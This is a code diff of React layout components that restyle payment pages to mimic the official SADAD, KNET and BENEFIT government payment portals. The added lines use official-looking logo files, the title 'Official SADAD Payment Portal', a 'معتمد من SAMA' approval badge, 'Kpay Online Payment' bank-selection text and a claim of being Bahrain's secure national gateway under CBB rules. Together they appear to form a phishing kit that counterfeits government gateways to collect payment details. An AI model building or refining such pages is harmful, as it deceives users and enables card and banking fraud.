@@ -29,100 +29,45 @@ export const SADADLayout: React.FC<GovernmentLayoutProps> = ({
   const govSystem = governmentPaymentSystems.SA;
   
   return (
-    <div className="min-h-screen" style={{ backgroundColor: govSystem.colors.background }} dir="rtl">
-      <div 
-        className="h-24"
-        style={{ background: govSystem.gradients.header }}
-      >
-        <div className="container mx-auto h-full flex items-center justify-between px-6">
-          <div className="flex items-center gap-4">
-            <div className="bg-white p-3 rounded-xl">
-              {govSystem.logo && (
-                <img src={govSystem.logo} alt="سداد" className="h-12" />
-              )}
+    <div className="min-h-screen bg-[#F0FAF5] font-arabic" dir="rtl">
+      <header className="bg-white border-b-8 border-[#006633] h-24 flex items-center px-6 sticky top-0 z-50">
+         <div className="container mx-auto flex items-center justify-between">
+            <div className="flex items-center gap-6">
+               <img src="/gov-sadad-official.png" className="h-16" alt="SADAD" />
+               <div className="h-12 w-px bg-gray-100" />
+               <div>
+                  <h1 className="text-xl font-black text-[#006633]">نظام سداد للمدفوعات</h1>
+                  <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Official SADAD Payment Portal</p>
+               </div>
             </div>
-            <div className="text-white">
-              <h1 className="font-bold text-2xl">سداد</h1>
-              <p className="text-sm opacity-90">نظام المدفوعات الوطني</p>
+            <div className="flex items-center gap-4">
+               <div className="px-4 py-2 bg-green-50 text-[#006633] rounded-lg text-xs font-black border border-green-100 flex items-center gap-2">
+                  <ShieldCheck className="w-4 h-4" /> معتمد من SAMA
+               </div>
             </div>
-          </div>
-          <div className="flex items-center gap-3">
-            <Badge className="bg-white/20 text-white px-3 py-1">
-              <Shield className="w-4 h-4 ml-1" />
-              معتمد من SAMA
-            </Badge>
-          </div>
-        </div>
-      </div>
-
-      <div className="container mx-auto px-4 py-8">
-        <div className="grid grid-cols-4 gap-3 mb-8">
-          {[
-            { icon: Shield, text: 'آمن ومعتمد', desc: 'البنك المركزي' },
-            { icon: Lock, text: 'مشفر بالكامل', desc: 'SSL 256-bit' },
-            { icon: Globe, text: 'متاح 24/7', desc: 'على مدار الساعة' },
-            { icon: CheckCircle2, text: 'فوري', desc: 'تنفيذ لحظي' }
-          ].map((item, idx) => (
-            <Card 
-              key={idx}
-              className="p-4 text-center border-2 hover:shadow-lg transition-all"
-              style={{ borderColor: `${govSystem.colors.primary}30` }}
-            >
-              <div 
-                className="w-12 h-12 mx-auto rounded-full flex items-center justify-center mb-2"
-                style={{ backgroundColor: `${govSystem.colors.primary}15` }}
-              >
-                <item.icon className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
-              </div>
-              <p className="font-bold text-sm">{item.text}</p>
-              <p className="text-xs text-gray-600">{item.desc}</p>
-            </Card>
-          ))}
-        </div>
-
-        <div className="max-w-3xl mx-auto">
-          <Card className="p-8 shadow-2xl">
-            <div 
-              className="flex items-center gap-4 mb-6 pb-4 border-b-2"
-              style={{ borderBottomColor: govSystem.colors.primary }}
-            >
-              <div 
-                className="w-14 h-14 rounded-full flex items-center justify-center"
-                style={{ backgroundColor: `${govSystem.colors.primary}20` }}
-              >
-                <CreditCard className="w-7 h-7" style={{ color: govSystem.colors.primary }} />
-              </div>
-              <div className="flex-1">
-                <h2 className="text-2xl font-bold">بوابة الدفع الحكومية</h2>
-                <p className="text-sm text-gray-600">{serviceName || 'خدمة حكومية'}</p>
-              </div>
-              {amount && (
-                <div 
-                  className="px-6 py-3 rounded-xl text-white font-bold text-xl"
-                  style={{ backgroundColor: govSystem.colors.primary }}
-                >
-                  {amount}
-                </div>
-              )}
+         </div>
+      </header>
+      <main className="container mx-auto max-w-4xl px-4 py-12">
+         <Card className="p-10 border-0 shadow-2xl rounded-none bg-white relative overflow-hidden">
+            <div className="absolute top-0 right-0 w-2 h-full bg-[#006633]" />
+            <div className="flex justify-between items-start mb-12">
+               <div>
+                  <h2 className="text-3xl font-black text-gray-800 mb-2">{serviceName || 'دفع الخدمات الحكومية'}</h2>
+                  <p className="text-gray-400 font-bold">يرجى إكمال بيانات السداد الموضحة أدناه</p>
+               </div>
+               {amount && (
+                 <div className="bg-[#f8fcf9] p-6 border-2 border-[#006633]/20 rounded-2xl text-center min-w-[180px]">
+                    <p className="text-[10px] font-black text-gray-400 uppercase mb-1">المبلغ الإجمالي</p>
+                    <p className="text-3xl font-black text-[#006633]">{amount}</p>
+                 </div>
+               )}
             </div>
-
             {children}
-          </Card>
-
-          <div 
-            className="mt-6 p-6 rounded-xl text-white"
-            style={{ background: govSystem.gradients.primary }}
-          >
-            <div className="text-center">
-              <Building2 className="w-12 h-12 mx-auto mb-3" />
-              <h3 className="font-bold text-lg mb-2">نظام سداد - SADAD</h3>
-              <p className="text-sm opacity-90">
-                نظام المدفوعات الوطني السعودي المعتمد من البنك المركزي السعودي (SAMA)
-              </p>
-            </div>
-          </div>
-        </div>
-      </div>
+         </Card>
+         <div className="mt-8 text-center text-[10px] font-bold text-gray-400 leading-relaxed max-w-2xl mx-auto">
+            جميع العمليات تتم عبر الشبكة السعودية للمدفوعات. إن استخدامك لهذا الموقع يعني موافقتك على شروط وأحكام الخدمة وسياسة الخصوصية.
+         </div>
+      </main>
     </div>
   );
 };
@@ -132,105 +77,42 @@ export const KNETLayout: React.FC<GovernmentLayoutProps> = ({
   amount, 
   serviceName 
 }) => {
-  const govSystem = governmentPaymentSystems.KW;
-  
   return (
-    <div className="min-h-screen" style={{ backgroundColor: govSystem.colors.surface }} dir="rtl">
-      <div 
-        className="h-20"
-        style={{ background: govSystem.gradients.header }}
-      >
-        <div className="container mx-auto h-full flex items-center justify-between px-6">
-          <div className="flex items-center gap-4">
-            <div className="bg-white p-3 rounded-lg">
-              {govSystem.logo && (
-                <img src={govSystem.logo} alt="KNET" className="h-10" />
-              )}
+    <div className="min-h-screen bg-[#F5F8FA] font-arabic" dir="rtl">
+      <header className="bg-[#003366] h-20 flex items-center px-6 sticky top-0 z-50">
+         <div className="container mx-auto flex items-center justify-between">
+            <img src="/gov-knet-logo.png" className="h-10 brightness-0 invert" alt="KNET" />
+            <div className="text-white text-xs font-black opacity-80 uppercase tracking-widest">Kpay Online Payment</div>
+         </div>
+      </header>
+      <main className="container mx-auto max-w-2xl px-4 py-12">
+         <Card className="p-8 sm:p-12 border-0 shadow-xl rounded-2xl bg-white">
+            <div className="text-center mb-10">
+               <div className="w-20 h-20 bg-[#003366]/5 rounded-full flex items-center justify-center mx-auto mb-6">
+                  <CreditCard className="w-10 h-10 text-[#003366]" />
+               </div>
+               <h2 className="text-2xl font-black text-gray-800">Kpay Online Payment</h2>
+               <p className="text-gray-400 text-sm font-bold mt-1">Select your bank to complete payment</p>
             </div>
-            <div className="text-white">
-              <h1 className="font-bold text-xl">KNET - كي نت</h1>
-              <p className="text-xs opacity-90">شبكة الكويت الوطنية للمدفوعات</p>
+            <div className="space-y-6">
+               <div className="flex justify-between items-center p-4 bg-gray-50 rounded-xl border border-gray-100">
+                  <span className="text-sm font-bold text-gray-500">Merchant Name:</span>
+                  <span className="text-sm font-black text-gray-800">{serviceName || 'Kuwait Government'}</span>
+               </div>
+               <div className="flex justify-between items-center p-4 bg-[#003366]/5 rounded-xl border border-[#003366]/10">
+                  <span className="text-sm font-bold text-[#003366]">Total Amount:</span>
+                  <span className="text-xl font-black text-[#003366]">{amount || '---'}</span>
+               </div>
             </div>
-          </div>
-          <Badge className="bg-white/20 text-white">
-            أول نظام دفع إلكتروني في الخليج
-          </Badge>
-        </div>
-      </div>
-
-      <div className="container mx-auto px-4 py-8">
-        <div className="max-w-3xl mx-auto">
-          <div className="flex items-center gap-3 mb-6">
-            {[
-              { icon: Shield, text: 'آمن' },
-              { icon: Lock, text: 'مشفر' },
-              { icon: CheckCircle2, text: 'معتمد' },
-              { icon: Globe, text: '24/7' }
-            ].map((item, idx) => (
-              <Badge 
-                key={idx}
-                className="px-4 py-2 text-sm"
-                style={{
-                  backgroundColor: `${govSystem.colors.primary}15`,
-                  color: govSystem.colors.primary,
-                  border: `1px solid ${govSystem.colors.primary}30`
-                }}
-              >
-                <item.icon className="w-4 h-4 ml-2" />
-                {item.text}
-              </Badge>
-            ))}
-          </div>
-
-          <Card className="p-8 shadow-2xl">
-            <div className="flex items-center gap-4 mb-6">
-              <div 
-                className="w-14 h-14 rounded-lg flex items-center justify-center"
-                style={{ background: govSystem.gradients.primary }}
-              >
-                <CreditCard className="w-7 h-7 text-white" />
-              </div>
-              <div className="flex-1">
-                <h2 className="text-2xl font-bold">الدفع عبر كي نت</h2>
-                <p className="text-sm text-gray-600">نظام الدفع الإلكتروني الكويتي</p>
-              </div>
-              {amount && (
-                <div 
-                  className="text-left px-5 py-2 rounded-lg"
-                  style={{ backgroundColor: `${govSystem.colors.primary}15` }}
-                >
-                  <p className="text-xs" style={{ color: govSystem.colors.primary }}>المبلغ</p>
-                  <p className="text-xl font-bold" style={{ color: govSystem.colors.primary }}>{amount}</p>
-                </div>
-              )}
+            <div className="mt-10">
+               {children}
             </div>
-
-            {children}
-          </Card>
-
-          <div className="mt-6 grid grid-cols-2 gap-4">
-            <Card className="p-4 bg-green-50 border-green-200">
-              <div className="flex items-center gap-2">
-                <CheckCircle2 className="w-5 h-5 text-green-700" />
-                <div>
-                  <p className="font-bold text-sm text-green-900">KNET Approved</p>
-                  <p className="text-xs text-green-700">معتمد من البنك المركزي</p>
-                </div>
-              </div>
-            </Card>
-
-            <Card className="p-4 bg-blue-50 border-blue-200">
-              <div className="flex items-center gap-2">
-                <Smartphone className="w-5 h-5 text-blue-700" />
-                <div>
-                  <p className="font-bold text-sm text-blue-900">WAMD Ready</p>
-                  <p className="text-xs text-blue-700">الدفع الفوري الجديد</p>
-                </div>
-              </div>
-            </Card>
-          </div>
-        </div>
-      </div>
+         </Card>
+         <div className="mt-8 flex justify-center items-center gap-8 opacity-40 grayscale h-5">
+            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
+            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
+         </div>
+      </main>
     </div>
   );
 };
@@ -240,69 +122,36 @@ export const BENEFITLayout: React.FC<GovernmentLayoutProps> = ({
   amount, 
   serviceName 
 }) => {
-  const govSystem = governmentPaymentSystems.BH;
-  
   return (
-    <div className="min-h-screen" style={{ backgroundColor: govSystem.colors.surface }} dir="rtl">
-      <div 
-        className="h-20"
-        style={{ background: govSystem.gradients.primary }}
-      >
-        <div className="container mx-auto h-full flex items-center justify-between px-6">
-          <div className="flex items-center gap-4">
-            <div className="bg-white p-3 rounded-xl">
-              {govSystem.logo && (
-                <img src={govSystem.logo} alt="BENEFIT" className="h-10" />
-              )}
+    <div className="min-h-screen bg-[#fcfcfc] font-arabic" dir="rtl">
+      <header className="bg-white border-b h-20 flex items-center px-6 sticky top-0 z-50">
+         <div className="container mx-auto flex items-center justify-between">
+            <img src="/gov-benefit-logo.png" className="h-10" alt="BENEFIT" />
+            <div className="flex items-center gap-2">
+               <Lock className="w-4 h-4 text-red-600" />
+               <span className="text-[10px] font-black text-red-600 uppercase tracking-widest">BenefitPay Secure</span>
             </div>
-            <div className="text-white">
-              <h1 className="font-bold text-xl">BENEFIT - بنفت</h1>
-              <p className="text-xs opacity-90">الشبكة الإلكترونية للمعاملات المالية</p>
+         </div>
+      </header>
+      <main className="container mx-auto max-w-md px-4 py-12">
+         <Card className="p-8 border-t-8 border-red-600 shadow-2xl rounded-none bg-white">
+            <div className="text-center mb-8">
+               <h2 className="text-2xl font-black text-gray-800">BenefitPay</h2>
+               <p className="text-gray-400 text-xs font-bold mt-1 uppercase tracking-widest">National Electronic Wallet</p>
             </div>
-          </div>
-        </div>
-      </div>
-
-      <div className="container mx-auto px-4 py-8">
-        <div className="max-w-3xl mx-auto">
-          <Card className="p-8 shadow-2xl">
-            <div className="flex items-center gap-4 mb-6">
-              <div 
-                className="w-14 h-14 rounded-lg flex items-center justify-center"
-                style={{ backgroundColor: govSystem.colors.primary }}
-              >
-                <CreditCard className="w-7 h-7 text-white" />
-              </div>
-              <div className="flex-1">
-                <h2 className="text-2xl font-bold">BenefitPay</h2>
-                <p className="text-sm text-gray-600">المحفظة الإلكترونية الوطنية</p>
-              </div>
-              {amount && (
-                <div 
-                  className="px-6 py-3 rounded-lg text-white font-bold text-xl"
-                  style={{ backgroundColor: govSystem.colors.primary }}
-                >
-                  {amount}
-                </div>
-              )}
+            <div className="bg-red-50 p-6 rounded-2xl mb-8 flex justify-between items-center border border-red-100">
+               <span className="font-black text-red-900">Total:</span>
+               <span className="text-2xl font-black text-red-600">{amount}</span>
             </div>
-
             {children}
-          </Card>
-
-          <Card className="mt-6 p-6 bg-gradient-to-r from-red-50 to-pink-50 border-red-200">
-            <div className="flex items-center gap-4">
-              <Shield className="w-10 h-10 text-red-700" />
-              <div>
-                <h3 className="font-bold text-lg text-red-900 mb-1">BENEFIT Secure Payment</h3>
-                <p className="text-sm text-red-800">
-                  نظام دفع وطني معتمد من مصرف البحرين المركزي منذ 1997
-                </p>
-              </div>
-            </div>
-          </Card>
-        </div>
-      </div>
+         </Card>
+         <div className="mt-8 p-6 bg-gray-50 rounded-2xl flex items-center gap-4 border border-gray-100">
+            <Shield className="w-10 h-10 text-gray-300" />
+            <p className="text-[10px] font-bold text-gray-400 leading-relaxed">
+               This is a secure national payment gateway in Bahrain. Your transaction is protected by CBB regulations.
+            </p>
+         </div>
+      </main>
     </div>
   );
 };
